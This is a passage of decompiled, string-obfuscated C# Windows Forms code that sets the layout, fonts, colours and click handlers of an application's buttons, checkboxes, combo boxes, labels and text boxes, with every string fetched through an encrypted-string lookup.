		((Control)pictureBox9).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EBA7A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)pictureBox9).Size = new Size(18, 23);
		pictureBox9.TabIndex = 99;
		pictureBox9.TabStop = false;
		((Control)button28).BackColor = Color.Green;
		((Control)button28).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0CE5F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e), 8f, (FontStyle)1);
		((Control)button28).ForeColor = SystemColors.ControlLightLight;
		((Control)button28).Location = new Point(765, 642);
		((Control)button28).Margin = new Padding(5, 3, 5, 3);
		((Control)button28).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B288A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63);
		((Control)button28).Size = new Size(71, 23);
		((Control)button28).TabIndex = 98;
		((Control)button28).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--183415037 ^ 0x199AB9B8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((ButtonBase)button28).UseVisualStyleBackColor = false;
		((Control)button27).BackColor = Color.Green;
		((Control)button27).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13740A5D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76), 8f, (FontStyle)1);
		((Control)button27).ForeColor = SystemColors.ControlLightLight;
		((Control)button27).Location = new Point(774, 468);
		((Control)button27).Margin = new Padding(5, 3, 5, 3);
		((Control)button27).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA031F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208);
		((Control)button27).Size = new Size(71, 23);
		((Control)button27).TabIndex = 97;
		((Control)button27).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--863542085 ^ 0x21099331 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((ButtonBase)button27).UseVisualStyleBackColor = false;
		((Control)button27).Click += button27_Click;
		((Control)button26).BackColor = Color.Blue;
		((Control)button26).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2BC06 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675), 10f, (FontStyle)1);
		((Control)button26).ForeColor = SystemColors.ControlLightLight;
		((Control)button26).Location = new Point(10, 76);
		((Control)button26).Margin = new Padding(5, 3, 5, 3);
		((Control)button26).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DC4CB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d);
		((Control)button26).Size = new Size(124, 38);
		((Control)button26).TabIndex = 96;
		((Control)button26).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x30028867 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((ButtonBase)button26).UseVisualStyleBackColor = false;
		((Control)button26).Click += button26_Click;
		((Control)button25).BackColor = Color.MediumOrchid;
		((Control)button25).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2023214386 ^ -87936295 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button25).ForeColor = SystemColors.ControlLightLight;
		((Control)button25).Location = new Point(380, 428);
		((Control)button25).Margin = new Padding(5, 3, 5, 3);
		((Control)button25).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC90894 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a);
		((Control)button25).Size = new Size(115, 38);
		((Control)button25).TabIndex = 95;
		((Control)button25).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319F24C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e);
		((ButtonBase)button25).UseVisualStyleBackColor = false;
		((Control)button25).Click += button25_Click;
		((Control)checkBox2).AutoSize = true;
		((Control)checkBox2).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA11E9E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad), 10f, (FontStyle)1);
		((Control)checkBox2).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox2).Location = new Point(1110, 493);
		((Control)checkBox2).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox2).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC908BA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a);
		((Control)checkBox2).Size = new Size(115, 20);
		((Control)checkBox2).TabIndex = 94;
		((Control)checkBox2).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1646586438 ^ -1884677052 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((ButtonBase)checkBox2).UseVisualStyleBackColor = true;
		checkBox2.CheckedChanged += checkBox2_CheckedChanged_1;
		((Control)checkBox1).AutoSize = true;
		((Control)checkBox1).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694609F7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f), 10f, (FontStyle)1);
		((Control)checkBox1).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox1).Location = new Point(1001, 495);
		((Control)checkBox1).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A639069 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427);
		((Control)checkBox1).Size = new Size(80, 20);
		((Control)checkBox1).TabIndex = 93;
		((Control)checkBox1).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CFBB0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb);
		((ButtonBase)checkBox1).UseVisualStyleBackColor = true;
		checkBox1.CheckedChanged += checkBox1_CheckedChanged_1;
		((Control)button24).BackColor = Color.Green;
		((Control)button24).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13740A5D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76), 8f, (FontStyle)1);
		((Control)button24).ForeColor = SystemColors.ControlLightLight;
		((Control)button24).Location = new Point(966, 585);
		((Control)button24).Margin = new Padding(5, 3, 5, 3);
		((Control)button24).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x26558AD6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e);
		((Control)button24).Size = new Size(71, 23);
		((Control)button24).TabIndex = 92;
		((Control)button24).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF9CF4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc);
		((ButtonBase)button24).UseVisualStyleBackColor = false;
		((Control)button24).Click += button24_Click;
		((Control)button23).BackColor = Color.Green;
		((Control)button23).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A10943 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc), 8f, (FontStyle)1);
		((Control)button23).ForeColor = SystemColors.ControlLightLight;
		((Control)button23).Location = new Point(1134, 585);
		((Control)button23).Margin = new Padding(5, 3, 5, 3);
		((Control)button23).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D4A2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3);
		((Control)button23).Size = new Size(71, 23);
		((Control)button23).TabIndex = 91;
		((Control)button23).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CFA0A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb);
		((ButtonBase)button23).UseVisualStyleBackColor = false;
		((Control)button23).Click += button23_Click;
		((Control)button22).BackColor = Color.Green;
		((Control)button22).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEF6A6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6), 8f, (FontStyle)1);
		((Control)button22).ForeColor = SystemColors.ControlLightLight;
		((Control)button22).Location = new Point(727, 585);
		((Control)button22).Margin = new Padding(5, 3, 5, 3);
		((Control)button22).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x42FE9A6E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe);
		((Control)button22).Size = new Size(71, 23);
		((Control)button22).TabIndex = 90;
		((Control)button22).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C29386 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290);
		((ButtonBase)button22).UseVisualStyleBackColor = false;
		((Control)button22).Click += button22_Click;
		((Control)button21).BackColor = Color.Green;
		((Control)button21).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC10E92 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06), 8f, (FontStyle)1);
		((Control)button21).ForeColor = SystemColors.ControlLightLight;
		((Control)button21).Location = new Point(1135, 529);
		((Control)button21).Margin = new Padding(5, 3, 5, 3);
		((Control)button21).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1148833791 ^ -968409977 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06);
		((Control)button21).Size = new Size(71, 23);
		((Control)button21).TabIndex = 89;
		((Control)button21).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F7275BA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165);
		((ButtonBase)button21).UseVisualStyleBackColor = false;
		((Control)button21).Click += button21_Click;
		((Control)button20).BackColor = Color.Green;
		((Control)button20).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A43EA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf), 8f, (FontStyle)1);
		((Control)button20).ForeColor = SystemColors.ControlLightLight;
		((Control)button20).Location = new Point(933, 529);
		((Control)button20).Margin = new Padding(5, 3, 5, 3);
		((Control)button20).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2B3FB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc);
		((Control)button20).Size = new Size(71, 23);
		((Control)button20).TabIndex = 88;
		((Control)button20).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B77D492 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2d06329f1bd54c2287b4ec6435bc1344);
		((ButtonBase)button20).UseVisualStyleBackColor = false;
		((Control)button20).Click += button20_Click;
		((Control)button19).BackColor = Color.Green;
		((Control)button19).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACB9DB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76), 8f, (FontStyle)1);
		((Control)button19).ForeColor = SystemColors.ControlLightLight;
		((Control)button19).Location = new Point(706, 529);
		((Control)button19).Margin = new Padding(5, 3, 5, 3);
		((Control)button19).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CFB32 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb);
		((Control)button19).Size = new Size(71, 23);
		((Control)button19).TabIndex = 87;
		((Control)button19).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF9CF4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc);
		((ButtonBase)button19).UseVisualStyleBackColor = false;
		((Control)button19).Click += button19_Click;
		((Control)button18).BackColor = Color.Green;
		((Control)button18).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA0017 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208), 8f, (FontStyle)1);
		((Control)button18).ForeColor = SystemColors.ControlLightLight;
		((Control)button18).Location = new Point(206, 529);
		((Control)button18).Margin = new Padding(5, 3, 5, 3);
		((Control)button18).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DEF87 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((Control)button18).Size = new Size(71, 23);
		((Control)button18).TabIndex = 86;
		((Control)button18).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875D9B5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((ButtonBase)button18).UseVisualStyleBackColor = false;
		((Control)button18).Click += button18_Click;
		((Control)button17).BackColor = Color.Green;
		((Control)button17).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--932377358 ^ 0x368835C9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2), 8f, (FontStyle)1);
		((Control)button17).ForeColor = SystemColors.ControlLightLight;
		((Control)button17).Location = new Point(95, 466);
		((Control)button17).Margin = new Padding(5, 3, 5, 3);
		((Control)button17).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875DF55 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((Control)button17).Size = new Size(66, 23);
		((Control)button17).TabIndex = 85;
		((Control)button17).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C10E50 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a);
		((ButtonBase)button17).UseVisualStyleBackColor = false;
		((Control)button17).Click += button17_Click;
		comboBox9.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox9).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CF912 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb), 10f, (FontStyle)1);
		((ListControl)comboBox9).FormattingEnabled = true;
		((Control)comboBox9).Location = new Point(10, 554);
		((Control)comboBox9).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox9).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F72725E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165);
		((Control)comboBox9).Size = new Size(162, 24);
		((Control)comboBox9).TabIndex = 84;
		comboBox9.SelectedIndexChanged += comboBox9_SelectedIndexChanged;
		comboBox7.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox7).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB4015 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e), 10f, (FontStyle)1);
		((ListControl)comboBox7).FormattingEnabled = true;
		comboBox7.Items.AddRange(new object[2]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CFC9C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB3CD7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f)
		});
		((Control)comboBox7).Location = new Point(1051, 666);
		((Control)comboBox7).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox7).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DC259 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d);
		((Control)comboBox7).Size = new Size(195, 24);
		((Control)comboBox7).TabIndex = 83;
		comboBox7.SelectedIndexChanged += comboBox7_SelectedIndexChanged;
		((Control)label34).AutoSize = true;
		((Control)label34).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FB09D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa), 10f, (FontStyle)1);
		((Control)label34).ForeColor = SystemColors.ControlLightLight;
		((Control)label34).Location = new Point(1043, 647);
		((Control)label34).Margin = new Padding(5, 0, 5, 0);
		((Control)label34).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-836630164 ^ -1364413184 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)label34).Size = new Size(98, 16);
		((Control)label34).TabIndex = 82;
		((Control)label34).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F3BE5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a);
		comboBox8.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox8).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB3955 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f), 10f, (FontStyle)1);
		((ListControl)comboBox8).FormattingEnabled = true;
		comboBox8.Items.AddRange(new object[3]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB3CDB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B2E82 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0CB59 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e)
		});
		((Control)comboBox8).Location = new Point(856, 666);
		((Control)comboBox8).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox8).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0CB7B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e);
		((Control)comboBox8).Size = new Size(185, 24);
		((Control)comboBox8).TabIndex = 81;
		comboBox8.SelectedIndexChanged += comboBox8_SelectedIndexChanged;
		((Control)label35).AutoSize = true;
		((Control)label35).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0CE5F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e), 10f, (FontStyle)1);
		((Control)label35).ForeColor = SystemColors.ControlLightLight;
		((Control)label35).Location = new Point(852, 647);
		((Control)label35).Margin = new Padding(5, 0, 5, 0);
		((Control)label35).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0CA91 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e);
		((Control)label35).Size = new Size(84, 16);
		((Control)label35).TabIndex = 80;
		((Control)label35).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCBFF8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6);
		((Control)textBox19).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC90A52 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a), 10f, (FontStyle)1);
		((Control)textBox19).Location = new Point(640, 667);
		((Control)textBox19).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCBFE6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6);
		((Control)textBox19).Size = new Size(208, 23);
		((Control)textBox19).TabIndex = 79;
		((Control)textBox19).TextChanged += textBox19_TextChanged;
		((Control)label33).AutoSize = true;
		((Control)label33).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694609F7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f), 10f, (FontStyle)1);
		((Control)label33).ForeColor = SystemColors.ControlLightLight;
		((Control)label33).Location = new Point(638, 647);
		((Control)label33).Margin = new Padding(5, 0, 5, 0);
		((Control)label33).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A10DCF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc);
		((Control)label33).Size = new Size(127, 16);
		((Control)label33).TabIndex = 78;
		((Control)label33).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8C1B8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e);
		((Control)textBox16).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1602055031 ^ -1155298793 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad), 10f, (FontStyle)1);
		((Control)textBox16).Location = new Point(642, 611);
		((Control)textBox16).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12710F38 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((Control)textBox16).Size = new Size(208, 23);
		((Control)textBox16).TabIndex = 77;
		((Control)textBox16).TextChanged += textBox16_TextChanged;
		((Control)textBox17).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EB93C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9), 10f, (FontStyle)1);
		((Control)textBox17).Location = new Point(856, 611);
		((Control)textBox17).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F6E43 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc);
		((Control)textBox17).Size = new Size(185, 23);
		((Control)textBox17).TabIndex = 76;
		((Control)textBox17).TextChanged += textBox17_TextChanged;
		((Control)textBox18).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x26558886 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e), 10f, (FontStyle)1);
		((Control)textBox18).Location = new Point(1047, 611);
